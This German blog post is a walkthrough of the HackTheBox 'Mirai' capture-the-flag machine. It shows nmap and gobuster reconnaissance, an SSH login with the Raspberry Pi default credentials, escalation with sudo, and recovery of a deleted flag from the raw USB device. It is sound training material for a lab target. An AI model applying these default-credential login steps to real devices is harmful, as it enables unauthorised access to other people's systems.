---
title: "HackTheBox - Mirai WriteUp | Tipps + Anleitung"
date: 2018-02-10T19:59:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---

[Mirai](https://www.hackthebox.eu/home/machines/profile/64) ist eine der vielen Verfügbaren CTF Challenges von [HackTheBox](https://hackthebox.eu/). [Mirai](https://www.hackthebox.eu/home/machines/profile/64) ist eine leichte Maschine von [HackTheBox](https://hackthebox.eu/) und sehr gut für Anfänger geeignet. Aber auch für Erfahrene, die eine Herausforderung für zwischendurch suchen.

[![schwierigkeit](https://imgur.com/pSKDFUC.jpg)](https://imgur.com/pSKDFUC)

## **Tipps**

- Informiere dich darüber, wie das [Mirai](https://de.wikipedia.org/wiki/Mirai_(Malware))-Botnetz sich ausgebreitet hat.
- Welches Betriebssystem hat die Maschine? Auf was für einem Gerät läuft dieses?  
Ein Nmap-Scan und die Website verraten dies.
- Standard Login-Daten sind immer was tolles. :)
- Root zu bekommen könnte nicht einfacher sein.
- Alles ist eine Datei. Wo können die Inhalte des USB-Sticks zu finden sein?

## **Video**

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/RMcGUrRzXVI/0.jpg)](http://www.youtube.com/watch?v=RMcGUrRzXVI)

## **Anleitung**

Als erstes kommt wie immer ein Nmap-Scan. Die Option -A sorgt dafür, dass Nmap das Betriebssystem und die Services herausfindet.

```shell
root@kali:~# nmap -A 10.10.10.48

[...]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
[...]
53/tcp open  domain  dnsmasq 2.76
[...]
80/tcp open  http    lighttpd 1.4.35
[...]
```

Nmap konnte drei offene Ports finden. SSH, Domain und HTTP. Außerdem scheint, dass Betriebssystem Debian zu sein.

Als nächstes bruteforcen wir die Verzeichnisse der Internetseite. Ich benutze dafür GoBuster, allerdings sind alternativen wie Dirb, Dirbuster, WFuzz, etc. genauso nützlich. Die Option **-t** legt fest wieviele Prozesse GoBuster parallel laufen lassen soll. Der Standard dabei ist 10.

```shell
root@kali:~# gobuster -u 10.10.10.48 -t 25 -w /usr/share/wordlists/dirb/common.txt

Gobuster v1.2 OJ Reeves (@TheColonial)
=====================================================
[+] Mode : dir
[+] Url/Domain : http://10.10.10.48/
[+] Threads : 25
[+] Wordlist : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/admin (Status: 301)
/swfobject.js (Status: 200)
=====================================================
```

Interessant. Es wurde nur ein Verzeichnis gefunden und zwar **admin**.

Sehen wir uns doch mal **http://www.10.10.10.48/admin/** an.

[![10.10.10.48/admin](https://imgur.com/7MMcehl.jpg)](https://imgur.com/7MMcehl)

Anscheinend haben wir es mit einem [Raspberry Pi](https://de.wikipedia.org/wiki/Raspberry_Pi) zu tun.

Die Standard Zugangsdaten bei einem Raspberry Pi mit Debian sind **Nutzername: pi und Passwort: raspberry**.  
Vielleicht haben wir Glück und diese wurden noch nicht verändert.

```shell
root@kali:~# ssh pi@10.10.10.48
pi@10.10.10.48's password

[...]

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $
```

Es hat tatsächlich funktioniert. Nun können wir uns die User-Flag holen.

```shell
pi@raspberrypi:~ $ ls
Desktop Documents Downloads Music Pictures [...]
pi@raspberrypi:~ $ cat ./Desktop/user.txt
ff8#########zensiert#########38d
```

Root zu werden, wird uns einfach gemacht.

```shell
pi@raspberrypi:~ $ sudo su
root@raspberrypi:/home/pi#
```

Nun weiter zur Root-Flag:

```shell
root@raspberrypi:/home/pi# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```

Den USB-Stick sollten wir unter **/media** finden können, falls dieser noch gemountet ist.

```shell
root@raspberrypi:/home/pi# cd /media
root@raspberrypi:/media# ls
usbstick
root@raspberrypi:/media# ls usbstick/
damnit.txt lost+found
root@raspberrypi:/media# cat usbstick/damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Die Datei die wir brauchen wurde vom USB-Stick gelöscht...

In Linux ist alles eine Datei. Unter **/dev** befinden sich alle Gerätedateien. Unter **/dev/sd*** können wir SATA-Festplatten und Externe Speichermedien wie z.B. USB-Sticks finden.  
Mit **cat** können wir diese ganz einfach anzeigen lassen.

```shell
root@raspberrypi:/media# cd /dev
root@raspberrypi:/dev# ls
[...] sda1 sda2 sdb [...]
root@raspberrypi:/dev# cat sdb
```

5\. letzte Zeile:

```shell
[...]
�|}*,.�����+-���3d3#########zensiert#########20b
[...]
```

Vielen Dank für's durchlesen. :)